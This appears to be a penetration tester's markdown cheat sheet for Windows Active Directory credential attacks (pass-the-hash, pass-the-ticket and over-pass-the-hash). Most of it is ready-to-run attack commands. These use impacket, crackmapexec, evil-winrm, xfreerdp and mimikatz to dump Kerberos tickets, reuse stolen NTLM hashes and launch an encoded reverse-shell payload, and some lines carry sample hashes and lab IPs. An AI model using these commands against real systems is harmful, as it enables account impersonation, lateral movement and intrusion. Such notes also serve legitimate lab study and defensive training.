### Pass The Hash

If you can’t access the KRBTGT account,

we can steal an account’s **NTLM password hash** and uses that hash directly to authenticate to other machines/services that accept NTLM, without knowing the plaintext password.


This requires:

1. **Privilege Level System**: You will need system privileges to perform the attack.
2. **NTLM Password Hash of the Account You Want to Emulate**: The NTLM hash of the target account.
3. **Enabled NTLM Authentication**: The server or service you are trying to access must allow NTLM authentication.


```sh

impacket-wmiexec -hashes <hash> <user>@<ip>

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

Invoke-WMIexec -Target <computer_name> -Username user -Hash <NTML_HASH>  -Command "powershell -e <reversehell_Base74>"

evil-winrm -i <IP> -u <user> -H <NTLM_hash> 

impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes <LM_HASH>:<NTLM_HASH> #replace LM hash with 32 0s or place a :NTML_HASH

#xfreerdp 
 xfreerdp3 /u:"heist.offsec\svc_apache$" /pth:9943473CE1243E91129513BB932E9C90 /v:192.168.235.165 +clipboard 
```
### Pass The Ticket

will load the Kerberos ticket from file `.kirbi` in memory and replays/uses it to access services as that user, bypassing needing the password

```
kerberos::ptt <ticket name>
```



###  Over-Pass-the-Hash

An over-pass-the-hash attack involves extracting the targeted user’s Kerberos  account’s NT hash and uses that hash to embedding it in your session. This allows you to impersonate the targeted user and gain access to the resources they have rights to.

First, extract the Kerberos tickets from the compromised machine
```sh
sekurlsa::tickets /export

#PAss the ticket to our session
kerberos::ptt <ticket name>

#open cmd
misc::cmd

#Check if the kerb token is ready to use 
klist
